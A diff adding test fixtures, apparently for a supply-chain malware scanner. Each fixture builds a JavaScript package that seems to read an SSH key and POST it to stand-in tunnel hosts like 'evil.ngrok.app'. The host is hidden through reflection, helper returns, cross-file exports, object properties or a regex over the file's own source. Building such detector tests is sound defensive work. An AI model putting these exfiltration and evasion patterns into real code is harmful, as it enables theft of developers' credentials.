@@ -384,6 +384,39 @@ CASES = {
     "suffix_allowlist_used_as_destination": pkg({"index.js": SSH + (
         "const cfg = {\n  allowedHosts: [\n    \".ngrok.io\",\n    \".trycloudflare.com\",\n"
         "  ],\n};\nfetch('https://x' + cfg.allowedHosts[0]" + POST_KEY)}, main="index.js"),
+    # (d) twins that read the holder without naming it: reflection, a helper's return
+    # value, an export, `this`, the file's own source.
+    "tunnel_placeholder_returned_and_reflected": pkg({"index.js": SSH + (
+        "function cfg() {\n  return {\n    placeholder: 'evil.ngrok.app',\n  };\n}\n"
+        "fetch('https://' + Object.values(cfg())[0] + '/c'" + POST_KEY)}, main="index.js"),
+    "suffix_allowlist_reflected_to_destination": pkg({"index.js": SSH + (
+        "const cfg = {\n  allowedHosts: [\n    \".ngrok.io\",\n    \".trycloudflare.com\",\n"
+        "  ],\n};\nfetch('https://x' + Object.values(cfg)[0][0]" + POST_KEY)}, main="index.js"),
+    "fake_suffix_list_reflected_to_destination": pkg({"index.js": SSH + host_list(
+        ["*.ck", "!www.ck", "evil.ngrok.io"], holder="const rules = {\n  psl: [")
+        .replace("];\n", "],\n};\n") + (
+        "fetch('https://' + Object.values(rules)[0].find((h) => h.startsWith('evil')) + '/c'"
+        + POST_KEY)}, main="index.js"),
+    "fake_suffix_list_returned_from_helper": pkg({"index.js": SSH + "function rules() {\n  return "
+        + host_list(["*.ck", "!www.ck", "evil.ngrok.io"], holder="{\n  psl: [")
+        .replace("];\n", "],\n};\n") + "}\n" + (
+        "fetch('https://' + Object.values(rules())[0].find((h) => h.startsWith('evil')) + '/c'" + POST_KEY)},
+        main="index.js"),
+    "tunnel_placeholder_exported_to_other_file": pkg({
+        "opts.js": "module.exports = {\n  placeholder: 'evil.ngrok.app',\n};\n",
+        "index.js": SSH + "fetch('https://' + require('./opts').placeholder + '/c'" + POST_KEY,
+    }, main="index.js"),
+    "tunnel_example_on_this_reflected": pkg({"index.js": SSH + (
+        "class Wizard {\n  setup() {\n    this.tips = {\n"
+        "      host: 'enter a bare hostname, e.g. evil.ngrok.app',\n    };\n  }\n"
+        "  go() {\n    const h = Object.values(this.tips)[0].split('e.g. ')[1];\n"
+        "    fetch('https://' + h + '/c'" + POST_KEY.rstrip("\n") + "\n  }\n}\n"
+        "const w = new Wizard();\nw.setup();\nw.go();\n")}, main="index.js"),
+    "tunnel_host_read_from_own_source": pkg({"index.js": SSH + (
+        "const fs = require('fs');\n"
+        "const o = { placeholder: 'evil.ngrok.app' };\n"
+        "const host = fs.readFileSync(__filename, 'utf8').match(/[a-z]+[.]ngrok[.]app/)[0];\n"
+        "fetch('https://' + host + '/c'" + POST_KEY)}, main="index.js"),
 }
 
 
